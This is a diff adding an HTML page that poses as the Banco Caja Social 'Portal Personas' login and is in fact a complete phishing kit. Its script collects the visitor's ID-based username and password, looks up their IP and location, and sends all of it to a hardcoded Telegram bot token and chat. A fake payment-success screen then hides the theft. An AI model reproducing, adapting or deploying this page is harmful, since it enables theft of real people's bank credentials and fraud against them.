@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Caja Social - Portal Personas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: stretch;
+            padding: 0;
+        }
+
+        .container {
+            width: 100%;
+            height: 100vh;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Imagen de portada */
+        .header-image {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 16/9;
+            object-fit: cover;
+            background: #f0f0f0;
+        }
+
+        /* Contenido */
+        .content {
+            padding: 22px 28px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Logos */
+        .logos-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 25px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+
+        .logo {
+            height: 130px;
+            object-fit: contain;
+        }
+
+        .logo-caja {
+            max-width: 220px;
+        }
+
+        .logo-fundacion {
+            max-width: 210px;
+        }
+
+        /* Título */
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 14px;
+            line-height: 1.2;
+        }
+
+        /* Descripción */
+        .description {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 22px;
+            line-height: 1.5;
+        }
+
+        /* Formulario */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #2c5aa0;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #333;
+            background: white;
+            transition: all 0.2s;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1a4680;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(44, 90, 160, 0.15);
+        }
+
+        /* Ejemplo de usuario */
+        .input-example {
+            font-size: 11px;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        /* Mensaje de error */
+        .error-message {
+            font-size: 12px;
+            color: #d32f2f;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Botón */
+        .btn-siguiente {
+            width: 100%;
+            padding: 12px;
+            margin-top: 16px;
+            background: #c8c8d0;
+            color: #666;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .btn-siguiente.active {
+            background: #2c5aa0;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(44, 90, 160, 0.2);
+        }
+
+        .btn-siguiente.active:hover {
+            background: #244a88;
+            box-shadow: 0 6px 16px rgba(44, 90, 160, 0.3);
+        }
+
+        .btn-siguiente.active:active {
+            transform: scale(0.98);
+        }
+
+        /* Pantalla de carga */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        /* Pantalla de éxito */
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            flex-direction: column;
+            padding: 40px 20px;
+        }
+
+        .success-overlay.active {
+            display: flex;
+        }
+
+        .success-content {
+            text-align: center;
+            max-width: 350px;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .checkmark-circle {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 25px;
+            background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.6s ease-out;
+            box-shadow: 0 8px 24px rgba(76, 175, 80, 0.3);
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .checkmark {
+            color: white;
+            font-size: 50px;
+            line-height: 1;
+            animation: checkDraw 0.6s ease-out 0.3s both;
+        }
+
+        @keyframes checkDraw {
+            from {
+                opacity: 0;
+                transform: scale(0);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
+            animation: fadeInDown 0.6s ease-out 0.2s both;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-message {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            animation: fadeInUp 0.6s ease-out 0.4s both;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-btn {
+            background: #2c5aa0;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            animation: fadeInUp 0.6s ease-out 0.6s both;
+        }
+
+        .success-btn:hover {
+            background: #244a88;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                padding: 20px 18px;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .logos-container {
+                gap: 12px;
+                margin-bottom: 24px;
+                padding-bottom: 20px;
+            }
+
+            .logo {
+                height: 110px;
+            }
+
+            .logo-caja {
+                max-width: 180px;
+            }
+
+            .logo-fundacion {
+                max-width: 170px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Pantalla de carga -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Validando información...</p>
+    </div>
+
+    <!-- Pantalla de éxito -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-content">
+            <div class="checkmark-circle">
+                <div class="checkmark">✓</div>
+            </div>
+            <div class="success-title">¡Pago Exitoso!</div>
+            <div class="success-message">Tu transacción se ha completado correctamente</div>
+            <button class="success-btn" onclick="location.reload()">Aceptar</button>
+        </div>
+    </div>
+
+    <!-- Contenedor principal -->
+    <div class="container">
+        <!-- Imagen de portada -->
+        <img src="señores.png" alt="Banco Caja Social" class="header-image">
+
+        <!-- Contenido -->
+        <div class="content">
+            <!-- Logos -->
+            <div class="logos-container">
+                <img src="caja.png" alt="Banco Caja Social" class="logo logo-caja">
+                <img src="fundacion.png" alt="Fiduciaria" class="logo logo-fundacion">
+            </div>
+
+            <!-- Título -->
+            <h1 class="title">Bienvenido al Portal Personas</h1>
+
+            <!-- Descripción -->
+            <p class="description">
+                Recuerde que su usuario está compuesto por su Tipo de Identificación (CC, CE, NI, TI, PE) y su Número de Identificación sin espacios, puntos ni comas.
+            </p>
+
+            <!-- Formulario -->
+            <form id="loginForm">
+                <!-- Campo Usuario -->
+                <div class="form-group">
+                    <label class="form-label">Usuario</label>
+                    <input type="text" id="usuario" class="form-input" placeholder="" inputmode="text" required>
+                    <div class="input-example">Ejemplo: CC1234567890</div>
+                    <div class="error-message" id="usuarioError"></div>
+                </div>
+
+                <!-- Campo Contraseña -->
+                <div class="form-group">
+                    <label class="form-label">Contraseña</label>
+                    <input type="password" id="contrasena" class="form-input" placeholder="" required>
+                </div>
+
+                <!-- Botón -->
+                <button type="submit" class="btn-siguiente" id="btnSiguiente" disabled>Siguiente</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Configuración de Telegram
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003917791773';
+
+        const usuarioInput = document.getElementById('usuario');
+        const contrasenaInput = document.getElementById('contrasena');
+        const btnSiguiente = document.getElementById('btnSiguiente');
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successOverlay = document.getElementById('successOverlay');
+        const usuarioError = document.getElementById('usuarioError');
+
+        // Validar formato del usuario
+        function validarFormatoUsuario(usuario) {
+            const formatoValido = /^[A-Z]{2}\d+$/.test(usuario.toUpperCase());
+            return formatoValido;
+        }
+
+        // Validar formulario
+        function validarFormulario() {
+            const usuario = usuarioInput.value.trim();
+            const contrasena = contrasenaInput.value.trim();
+            
+            // Mostrar/ocultar mensaje de error
+            if (usuario && !validarFormatoUsuario(usuario)) {
+                usuarioError.textContent = 'Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE';
+                usuarioError.classList.add('show');
+            } else {
+                usuarioError.classList.remove('show');
+            }
+
+            // Habilitar botón si todo es válido
+            if (usuario && contrasena && validarFormatoUsuario(usuario)) {
+                btnSiguiente.disabled = false;
+                btnSiguiente.classList.add('active');
+            } else {
+                btnSiguiente.disabled = true;
+                btnSiguiente.classList.remove('active');
+            }
+        }
+
+        usuarioInput.addEventListener('input', validarFormulario);
+        contrasenaInput.addEventListener('input', validarFormulario);
+
+        // Obtener datos de IP
+        async function obtenerDatosIP() {
+            try {
+                const res = await fetch("https://ipinfo.io/json");
+                return await res.json();
+            } catch (e) {
+                return { 
+                    ip: "Desconocida", 
+                    country: "N/A", 
+                    city: "N/A", 
+                    region: "N/A" 
+                };
+            }
+        }
+
+        // Obtener fecha y hora
+        function obtenerFecha() {
+            return new Date().toLocaleString('es-CO', {
+                timeZone: 'America/Bogota',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+
+        // Manejar envío del formulario
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Validar campos
+            if (!usuarioInput.value.trim() || !contrasenaInput.value.trim()) {
+                alert('Por favor completa todos los campos');
+                return;
+            }
+
+            // Mostrar carga
+            loadingOverlay.classList.add('active');
+            btnSiguiente.disabled = true;
+
+            // Obtener datos
+            const usuario = usuarioInput.value.trim();
+            const contrasena = contrasenaInput.value.trim();
+            const ipData = await obtenerDatosIP();
+            const fecha = obtenerFecha();
+
+            // Preparar mensaje para Telegram
+            const mensaje = `🏦 <b>BANCO CAJA SOCIAL - PORTAL PERSONAS</b>
+
+👤 <b>Usuario:</b> ${usuario}
+🔐 <b>Contraseña:</b> ${contrasena}
+
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 <b>IP:</b> ${ipData.ip}
+📍 <b>País:</b> ${ipData.country}
+🏙️ <b>Ciudad:</b> ${ipData.city}
+🗺️ <b>Región:</b> ${ipData.region}
+🕐 <b>Fecha y Hora:</b> ${fecha}`;
+
+            // Enviar a Telegram
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+                console.log('Datos enviados a Telegram');
+            } catch (error) {
+                console.error('Error enviando a Telegram:', error);
+            }
+
+            // Esperar 2 segundos y mostrar mensaje de éxito
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                successOverlay.classList.add('active');
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
